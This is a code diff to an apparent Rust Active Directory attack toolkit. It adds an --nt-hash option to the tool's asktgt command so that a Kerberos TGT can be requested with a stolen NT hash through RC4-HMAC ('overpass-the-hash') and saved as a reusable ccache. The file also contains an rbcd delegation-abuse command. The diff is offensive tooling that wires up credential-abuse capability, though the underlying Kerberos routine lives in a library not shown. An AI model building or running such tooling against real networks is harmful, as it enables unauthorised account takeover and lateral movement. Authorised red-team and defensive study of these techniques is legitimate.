@@ -356,8 +356,12 @@ struct AsktgtArgs {
     /// KDC host[:port]
     #[arg(long)]
     kdc: String,
+    /// Password auth (AES256). Mutually exclusive with --nt-hash.
     #[arg(long)]
-    password: String,
+    password: Option<String>,
+    /// NT hash (32 hex) → overpass-the-hash via RC4-HMAC (legacy / RC4-enabled DCs).
+    #[arg(long)]
+    nt_hash: Option<String>,
     /// Output ccache path (defaults to <user>.ccache)
     #[arg(long)]
     out: Option<String>,
@@ -589,7 +593,15 @@ async fn rbcd(a: RbcdArgs) -> Result<()> {
 
 /// Ask-TGT: obtain a TGT with a password and write a reusable MIT ccache.
 async fn asktgt(a: AsktgtArgs) -> Result<()> {
-    let ccache = adhammer_kerberos::asktgt(&a.user, &a.realm, &a.kdc, &a.password).await?;
+    let ccache = match (&a.nt_hash, &a.password) {
+        (Some(h), None) => {
+            let nt = parse_nt_hash(h)?;
+            println!("[*] overpass-the-hash (RC4-HMAC) for {}", a.user);
+            adhammer_kerberos::overpass_the_hash(&a.user, &a.realm, &a.kdc, &nt).await?
+        }
+        (None, Some(pw)) => adhammer_kerberos::asktgt(&a.user, &a.realm, &a.kdc, pw).await?,
+        _ => anyhow::bail!("provide exactly one of --password or --nt-hash"),
+    };
     let out = a.out.unwrap_or_else(|| format!("{}.ccache", a.user));
     std::fs::write(&out, &ccache)?;
     println!(
